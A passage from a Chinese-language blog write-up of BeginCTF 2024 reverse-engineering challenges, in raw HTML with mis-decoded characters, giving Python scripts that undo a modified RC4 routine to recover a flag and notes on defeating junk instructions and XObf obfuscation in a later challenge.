src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706752491098-e585956b-06d4-486d-9ba6-0748bec110c3.png" class="" title="img"><p>ä¼ªrc4ï¼Ÿ</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706753133019-c9c3925b-8148-4024-acc2-0973d7a0630b.png" class="" title="img"><p>strå¤åˆ¶æœ‰ç‚¹å¥‡æ€ªï¼Œæ˜¯0åˆ°strlenï¼Œåé¢å¯†æ–‡æ¯”è¾ƒä¹Ÿæ˜¯å°‘äº†ä¸€ä½</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706758798885-0cfdbb8c-e207-411e-8b35-72cc4bb4a450.png" class="" title="img"><p>ç›´æ¥é€†å‘è·‘å‡ºæ¥è¿™ä¸ªé¬¼ä¸œè¥¿</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706759274005-f288eca0-6feb-4faa-82b4-80114557bd41.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python">s1=<span class="hljs-string">&#x27;m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n&#x27;</span><br>s2=<span class="hljs-string">&#x27;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&#x27;</span><br><span class="hljs-comment">#s2=[0x2b, 0x69, 0x26, 0x5b, 0x40, 0x59, 0x3a, 0x67, 0x38, 0x5b, 0x26, 0x6c, 0x24, 0x66, 0x38, 0x53, 0x38, 0x76, 0x24, 0x59, 0x26, 0x65, 0x3e, 0x7b]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s2))<br>a=[<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>,<br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>,<br>  <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>s_ni=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x2C</span>,<br>  <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x26</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br>s=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x27</span>,<br>  <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xE1</span>,<br>  <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x95</span>,<br>  <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x88</span>,<br>  <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x46</span>,<br>  <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0x93</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x6C</span>,<br>  <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x34</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xAD</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF3</span>,<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xD7</span>,<br>  <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x08</span>,<br>  <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x15</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">s,a</span>):<br>    i=<span class="hljs-number">0</span><br>    j=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>):<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>        j=(j+s[i])%<span class="hljs-number">256</span><br>        s[i],s[j]=s[j],s[i]<br>        a[k]^=s[(s[i]+s[j])%<span class="hljs-number">256</span>]<br>    <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rc4(s_ni,a)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        flag+=<span class="hljs-built_in">chr</span>(a[i]+<span class="hljs-number">112</span>-<span class="hljs-built_in">ord</span>(s1[i]))<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>åé¢æ˜¾ç¤ºè¯´ä¸Šé¢æ¯ç­”å¯¹ä¸€ä¸ªé—®é¢˜ï¼Œå°±å¡«å……ä¸€éƒ¨åˆ†sç›’ï¼Œæ‰€ä»¥æˆ‘çš„ç»•è¿‡ä¼šä½¿sç›’æœ‰é—®é¢˜ï¼Œæ€ªä¸å¾—è¯´æ­£å‘åŠ å¯†ä¹Ÿä¼šä¸å¯¹</p><p>æ­£ç¡®çš„sç›’ï¼Œæœç„¶å’Œæˆ‘çš„æœ‰å·®åˆ«</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707439204823-edbdf260-1e3b-49fa-a3ce-be558529e539.png" class="" title="img"><p>ä¹Ÿå¯ä»¥ç›´æ¥çŒœæ˜¯rc4ï¼Œå› ä¸ºæˆ‘æ‰¾ä¸åˆ°rc4çš„åˆå§‹åŒ–è¿‡ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-string">b&quot;5m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n\x8e&quot;</span><br><span class="hljs-comment"># tmp[i] = flag[i] + t[i]-112</span><br><span class="hljs-keyword">from</span> Crypto.Cipher.ARC4 <span class="hljs-keyword">import</span> *<br>enc = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x41</span>])<br>rc4 = new(t)<br>p = rc4.decrypt(enc)<br><span class="hljs-built_in">print</span>(p)<br>p = <span class="hljs-built_in">list</span>(p)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(p)):<br>    p[i] = (p[i]+<span class="hljs-number">112</span>-t[i])&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(p))<br></code></pre></td></tr></table></figure><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707441120328-53d83018-9ea2-44fe-aa4f-fa2e2de7cb8f.png" class="" title="img"><p>è¿˜å¯ä»¥ç›´æ¥äº¤å‰å¼•ç”¨ï¼ˆxï¼‰æ‰¾èµ„æº</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662434882-6feb5db8-f44a-40fa-8ec9-8b44a01888b6.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662422315-caff5912-babb-4e66-bcc5-6ee6be8f6c4d.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707662480862-2d632a90-b003-4300-9d15-2c5f2dea269e.png" class="" title="img"><h2 id="superguesser-1"><a href="#superguesser-1" class="headerlink" title="superguesser-1"></a>superguesser-1</h2><p>æœ‰å¾ˆå¤šè¿™æ ·çš„èŠ±æŒ‡ä»¤ï¼Œåç¼–è¯‘é”™è¯¯åœ¨æ•°æ®åé¢</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707117897382-e58f2155-9ef6-466c-869a-4461f6d67594.png" class="" title="img"><p>è½¬åŒ–ä¸ºæ•°æ®ä¹‹åæ— æ³•åˆ›å»ºå‡½æ•°</p><p>å¯èƒ½ç”¨è„šæœ¬å»èŠ±æŒ‡ä»¤ï¼Ÿ</p><p>åŠ äº†XObfæ··æ·†å™¨</p><p>ä¸‹ç¡¬ä»¶æ–­ç‚¹å¯ä»¥åœ¨è¿™äº›å­—ç¬¦ä¸²è¢«å¼•ç”¨çš„æ—¶å€™æ–­ä¸‹æ¥</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442599961-93f1f62a-e681-4f3b-b0fa-10779f6d4dee.png" class="" title="img"><p>å¯ä»¥çœ‹åˆ°åœåœ¨äº†è¾“å…¥</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442732300-157a7c9c-9f40-4def-b496-c0a92d0d830b.png" class="" title="img"><p>ä¸æ–­ctrl+f7ï¼ˆæ‰¾å‡½æ•°è°ƒç”¨å…³ç³»ï¼‰</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707442802923-b739e556-ff29-4b2a-824f-fbe59734c8de.png" class="" title="img"><p>ç›´æ¥çŒœå¼‚æˆ–</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707458525652-680dcd9a-f6c9-443b-9571-2c9bc92e4d5f.png" class="" title="img"><img 